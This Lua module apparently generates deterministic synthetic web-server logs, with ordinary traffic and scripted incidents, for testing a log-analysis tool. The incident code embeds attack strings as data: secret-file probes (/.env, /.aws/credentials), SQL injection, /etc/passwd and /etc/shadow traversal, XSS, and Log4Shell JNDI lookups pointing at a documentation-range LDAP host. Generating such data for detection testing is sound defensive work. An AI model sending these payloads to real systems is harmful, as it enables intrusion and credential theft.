--- Deterministic synthetic web-server logs: realistic traffic plus scripted incidents.
--
-- Used by the test suite, `tools/gen_examples.lua` and `tools/make_recording.lua`. Every random
-- choice comes from a seeded generator, so the same options always produce byte-identical logs.
-- All addresses are RFC 5737 / RFC 3849 documentation addresses; nothing here refers to a real host.
-- @module tools.loggen
local json = require("loglens.json")
local lcg = require("tools.lcg")
local time = require("loglens.time")

local M = {}

local MONTHS = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" }

local USER_AGENTS = {
  { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 34 },
  { "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36", 18 },
  { "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", 16 },
  { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15", 8 },
  { "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", 9 },
  { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", 7 },
}

-- { { address, user agent }, weight }
local BOTS = {
  { { "198.51.100.230", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" }, 9 },
  { { "198.51.100.231", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" }, 5 },
  { { "198.51.100.232", "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" }, 6 },
  { { "198.51.100.233", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" }, 3 },
  { { "198.51.100.234", "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.1; +https://openai.com/gptbot)" }, 3 },
  { { "198.51.100.235", "curl/8.4.0" }, 2 },
}

local PAGES = {
  { "/", 22 }, { "/pricing", 6 }, { "/about", 3 }, { "/blog", 7 }, { "/blog/hello-world", 5 },
  { "/blog/release-notes", 4 }, { "/docs/getting-started", 6 }, { "/docs/api", 4 },
  { "/contact", 2 }, { "/account", 3 }, { "/features", 4 },
}

local STATIC = {
  { "/static/app.3f9a1c.js", 14 }, { "/static/app.a82b7e.css", 12 },
  { "/static/vendor.91c0de.js", 8 }, { "/images/hero.webp", 6 }, { "/images/logo.svg", 7 },
  { "/favicon.ico", 6 }, { "/robots.txt", 1 }, { "/sitemap.xml", 1 },
}

local API = {
  { "/api/v1/products", 10 }, { "/api/v1/products/42", 5 }, { "/api/v1/products/7", 3 },
  { "/api/v1/cart", 4 }, { "/api/v1/me", 3 },
}

local SEARCH_WORDS = { "shoes", "laptop", "headphones", "coffee", "camera", "backpack", "monitor", "keyboard" }
local MISSING = { "/old-page", "/blog/typo-post", "/images/missing.png", "/apple-touch-icon.png", "/downloads/report-2019.pdf" }
local REFERRERS = {
  { "-", 30 }, { "https://www.google.com/", 38 }, { "https://www.bing.com/", 3 },
  { "https://duckduckgo.com/", 4 }, { "https://news.ycombinator.com/", 3 },
  { "https://www.reddit.com/", 3 }, { "https://t.co/Xk3d9", 4 }, { "https://example.com/", 15 },
}

local PROBES = {
  "/.env", "/.git/config", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/index.php", "/cgi-bin/luci",
  "/boaform/admin/formLogin", "/actuator/env", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
  "/backup.sql", "/.aws/credentials", "/server-status", "/admin/config.php", "/shell.php",
}

local SQLI = {
  "/api/v1/products?id=1' AND 1=1--", "/api/v1/products?id=1 UNION SELECT username,password FROM users",
  "/api/v1/products?id=1;WAITFOR DELAY '0:0:5'", "/api/v1/products?id=1 AND SLEEP(5)",
  "/api/v1/products?id=-1' OR '1'='1", "/api/v1/products?id=1/**/UNION/**/SELECT/**/null,null",
}

--- Formats an epoch as `10/Nov/2026:14:03:09 +0000`.
function M.clf_time(ts)
  local y, m, d = time.civil_from_days(ts // 86400)
  local s = ts % 86400
  return string.format("%02d/%s/%04d:%02d:%02d:%02d +0000", d, MONTHS[m], y, s // 3600,
    (s % 3600) // 60, s % 60)
end

local function escape(text)
  return (text:gsub('[%c"\\\127-\255]', function(c)
    return string.format("\\x%02X", c:byte())
  end))
end

local function make_clients(rng, count)
  local clients = {}
  local prefixes = { "192.0.2.", "198.51.100.", "203.0.113." }
  for i = 1, count do
    local ip
    if i % 12 == 0 then
      ip = string.format("2001:db8:abcd::%x", i)
    else
      ip = prefixes[i % 3 + 1] .. (i % 190 + 1)
    end
    clients[i] = { ip = ip, ua = rng:weighted(USER_AGENTS), weight = 1 / i ^ 0.9 }
  end
  return clients
end

local function pick_client(rng, clients, total)
  local target = rng:float() * total
  for _, client in ipairs(clients) do
    target = target - client.weight
    if target < 0 then
      return client
    end
  end
  return clients[#clients]
end

local function kind_status(rng, kind, method)
  if method == "POST" then
    return rng:weighted({ { 302, 62 }, { 200, 20 }, { 401, 14 }, { 400, 3 }, { 500, 1 } })
  elseif kind == "static" then
    return rng:weighted({ { 200, 92 }, { 304, 8 } })
  elseif kind == "page" then
    return rng:weighted({ { 200, 94.8 }, { 301, 3 }, { 304, 2 }, { 500, 0.2 } })
  end
  return rng:weighted({ { 200, 93 }, { 400, 2.5 }, { 401, 2 }, { 404, 1.5 }, { 500, 1 } })
end

local LATENCY = {
  static = { 0.003, 0.4 },
  page = { 0.045, 0.5 },
  api = { 0.06, 0.6 },
  search = { 0.28, 0.85 },
  post = { 0.12, 0.6 },
}

local function round3(x)
  return math.floor(x * 1000 + 0.5) / 1000
end

-- Chooses the request for a regular visitor or crawler and returns the event.
local function regular_event(rng, ts, clients, total_weight, with_timing)
  local bot = rng:chance(0.045) and rng:weighted(BOTS)
  local client = bot and { ip = bot[1], ua = bot[2] } or pick_client(rng, clients, total_weight)
  bot = bot and true or false
  local kind = rng:weighted({ { "static", 40 }, { "page", 36 }, { "api", 15 }, { "search", 5 }, { "post", 4 } })
  local method, target, missing = "GET", nil, false
  if bot then
    kind = "page"
  end
  if kind == "static" then
    target = rng:weighted(STATIC)
  elseif kind == "page" then
    if rng:chance(0.02) then
      target, missing = rng:pick(MISSING), true
    else
      target = rng:weighted(PAGES)
    end
  elseif kind == "api" then
    target = rng:weighted(API)
  elseif kind == "search" then
    target = "/api/v1/search?q=" .. rng:pick(SEARCH_WORDS) .. "&page=" .. rng:range(1, 4)
  else
    method = "POST"
    target = rng:weighted({ { "/login", 4 }, { "/api/v1/cart", 3 }, { "/api/v1/checkout", 3 } })
  end
  local status = missing and 404 or kind_status(rng, kind, method)
  local bytes
  if status == 304 then
    bytes = 0
  elseif status == 301 or status == 302 then
    bytes = rng:range(150, 230)
  elseif kind == "static" then
    bytes = rng:range(2000, 180000)
  elseif kind == "page" then
    bytes = rng:range(6000, 48000)
  else
    bytes = rng:range(300, 14000)
  end
  local event = {
    ip = client.ip,
    ts = ts,
    method = method,
    target = target,
    proto = rng:chance(0.55) and "HTTP/2.0" or "HTTP/1.1",
    status = status,
    bytes = bytes,
    ua = client.ua,
  }
  if not bot and kind ~= "static" then
    event.referer = rng:weighted(REFERRERS)
  elseif not bot then
    event.referer = rng:chance(0.7) and "https://example.com/" or "-"
  else
    event.referer = "-"
  end
  if with_timing then
    local params = LATENCY[kind]
    local rt = round3(math.max(0.001, rng:lognormal(params[1], params[2])))
    event.rt = rt
    event.urt = kind ~= "static" and round3(rt * 0.9) or nil
  end
  return event
end

-- Scripted incidents. Each returns events (unsorted); `at` is a function of the time window.
local function incident_events(rng, start, duration, with_timing)
  local events = {}
  local function add(event)
    event.method = event.method or "GET"
    event.proto = event.proto or "HTTP/1.1"
    event.bytes = event.bytes or rng:range(150, 900)
    event.referer = event.referer or "-"
    if with_timing then
      event.rt = event.rt or round3(rng:lognormal(0.01, 0.4))
    end
    events[#events + 1] = event
  end

  local t0 = start + duration * 0.20
  for i = 1, 45 do
    add({ ip = "203.0.113.201", ts = math.floor(t0 + i * 2), target = PROBES[(i - 1) % #PROBES + 1],
      status = 404, ua = "Mozilla/5.0 zgrab/0.x" })
  end

  t0 = start + duration * 0.35
  for i = 1, 60 do
    add({ ip = "198.51.100.202", ts = math.floor(t0 + i * 4), target = SQLI[(i - 1) % #SQLI + 1],
      status = i % 9 == 0 and 500 or 200, ua = "sqlmap/1.7.11#stable (https://sqlmap.org)" })
  end

  t0 = start + duration * 0.45
  for i = 1, 70 do
    add({ ip = "198.51.100.203", ts = math.floor(t0 + i * 3), method = "POST", target = "/wp-login.php",
      status = 200, ua = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" })
  end

  t0 = start + duration * 0.52
  for i, target in ipairs({ "/../../etc/passwd", "/download?file=../../../etc/passwd",
    "/%2e%2e/%2e%2e/etc/passwd", "/static/..%2f..%2fetc%2fshadow", "/?page=php://filter/resource=index.php",
    "/cgi-bin/.%2e/.%2e/bin/sh", "/?f=../../windows/win.ini", "/x%00.jpg" }) do
    add({ ip = "192.0.2.204", ts = math.floor(t0 + i * 7), target = target, status = i == 2 and 200 or 404,
      ua = "python-requests/2.31.0" })
  end

  t0 = start + duration * 0.58
  add({ ip = "192.0.2.205", ts = math.floor(t0), target = "/", status = 400, ua = "${jndi:ldap://203.0.113.66:1389/a}" })
  add({ ip = "192.0.2.205", ts = math.floor(t0 + 3), target = "/?x=${jndi:ldap://203.0.113.66:1389/a}",
    status = 400, ua = "Mozilla/5.0" })
  add({ ip = "192.0.2.205", ts = math.floor(t0 + 6), target = "/", status = 200, ua = "Mozilla/5.0",
    referer = "${${lower:j}ndi:rmi://203.0.113.66/a}" })

  t0 = start + duration * 0.62
  for i = 1, 6 do
    add({ ip = "198.51.100.206", ts = math.floor(t0 + i * 5), target = "/api/v1/search?q=<script>alert(" .. i .. ")</script>",
      status = 200, ua = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" })
  end

  t0 = start + duration * 0.70
  for i = 1, 520 do
    add({ ip = "192.0.2.207", ts = math.floor(t0 + i * 0.29), target = "/api/v1/products", status = 200,
      ua = "python-requests/2.31.0", bytes = rng:range(2000, 9000) })
  end

  t0 = start + duration * 0.80
  for i = 1, 110 do
    local failed = rng:chance(0.85)
    add({ ip = string.format("192.0.2.%d", rng:range(1, 60)), ts = math.floor(t0 + i * 4), method = "POST",
      target = "/api/v1/checkout", status = failed and rng:pick({ 500, 500, 502, 503 }) or 200,
      ua = USER_AGENTS[1][1], rt = with_timing and round3(failed and rng:lognormal(1.8, 0.3) or 0.4) or nil })
  end
  return events
end

local function diurnal(ts)
  local hour = (ts % 86400) / 3600
  return 0.25 + 0.75 * (1 + math.cos(2 * math.pi * (hour - 14) / 24)) / 2
end

--- Generates events.
-- @param opts table|nil `{ seed = 1, count = 1000, start = <epoch of 2026-11-09T06:00:00Z>,
--   duration = 43200, timing = true, attacks = true, clients = 160 }`; `count` is the number of
--   regular requests, incidents (scans, brute force, 5xx burst ...) are added on top
-- @return table[] events sorted by time (`ip, ts, method, target, proto, status, bytes, referer,
--   ua, rt, urt`)
function M.events(opts)
  opts = opts or {}
  local rng = lcg.new(opts.seed or 1)
  local count = opts.count or 1000
  local start = opts.start or time.parse_iso("2026-11-09T06:00:00Z")
  local duration = opts.duration or 43200
  local with_timing = opts.timing ~= false
  local clients = make_clients(rng, opts.clients or 160)
  local total_weight = 0
  for _, client in ipairs(clients) do
    total_weight = total_weight + client.weight
  end

  local stamps = {}
  while #stamps < count do
    local ts = start + math.floor(rng:float() * duration)
    if rng:float() < diurnal(ts) then
      stamps[#stamps + 1] = ts
    end
  end
  table.sort(stamps)

  local events = {}
  for i, ts in ipairs(stamps) do
    events[i] = regular_event(rng, ts, clients, total_weight, with_timing)
  end
  if opts.attacks ~= false then
    for _, event in ipairs(incident_events(rng, start, duration, with_timing)) do
      events[#events + 1] = event
    end
  end
  for i, event in ipairs(events) do
    event.order = i
  end
  table.sort(events, function(a, b)
    if a.ts ~= b.ts then
      return a.ts < b.ts
    end
    return a.order < b.order
  end)
  for _, event in ipairs(events) do
    event.order = nil
  end
  return events
end

local function timing_columns(event)
  if not event.rt then
    return ""
  end
  return string.format(" %.3f %s", event.rt, event.urt and string.format("%.3f", event.urt) or "-")
end

--- Formats one event in the named format.
-- @param event table
-- @param format string "combined", "common", "json" or "caddy"
-- @return string
function M.format_event(event, format)
  if format == "common" then
    return string.format('%s - - [%s] "%s %s %s" %d %d', event.ip, M.clf_time(event.ts), event.method,
      escape(event.target), event.proto, event.status, event.bytes)
  elseif format == "json" then
    return json.encode({
      remote_addr = event.ip,
      time_iso8601 = time.format_iso(event.ts):gsub("Z$", "+00:00"),
      request_method = event.method,
      request_uri = event.target,
      server_protocol = event.proto,
      status = tostring(event.status),
      body_bytes_sent = tostring(event.bytes),
      http_referer = event.referer and event.referer ~= "-" and event.referer or "",
      http_user_agent = event.ua or "",
      request_time = event.rt and string.format("%.3f", event.rt) or nil,
      upstream_response_time = event.urt and string.format("%.3f", event.urt) or nil,
    })
  elseif format == "caddy" then
    local headers = { ["User-Agent"] = { event.ua or "" } }
    if event.referer and event.referer ~= "-" then
      headers.Referer = { event.referer }
    end
    return json.encode({
      level = "info",
      ts = event.ts + (event.bytes % 1000) / 1000,
      logger = "http.log.access.log0",
      msg = "handled request",
      request = {
        remote_ip = event.ip,
        remote_port = tostring(40000 + event.bytes % 20000),
        client_ip = event.ip,
        proto = event.proto,
        method = event.method,
        host = "example.com",
        uri = event.target,
        headers = headers,
      },
      bytes_read = 0,
      user_id = "",
      duration = event.rt or 0.002,
      size = event.bytes,
      status = event.status,
    })
  end
  return string.format('%s - - [%s] "%s %s %s" %d %d "%s" "%s"%s', event.ip, M.clf_time(event.ts),
    event.method, escape(event.target), event.proto, event.status, event.bytes,
    escape(event.referer or "-"), escape(event.ua or "-"), timing_columns(event))
end

--- Generates formatted log lines (no trailing newlines).
-- @param opts table|nil as for `events`, plus `format` ("combined" default, "common", "json",
--   "caddy"); request timings are only written for "combined", "json" and "caddy"
-- @return string[]
function M.lines(opts)
  opts = opts or {}
  local format = opts.format or "combined"
  local lines = {}
  for i, event in ipairs(M.events(opts)) do
    lines[i] = M.format_event(event, format)
  end
  return lines
end

return M
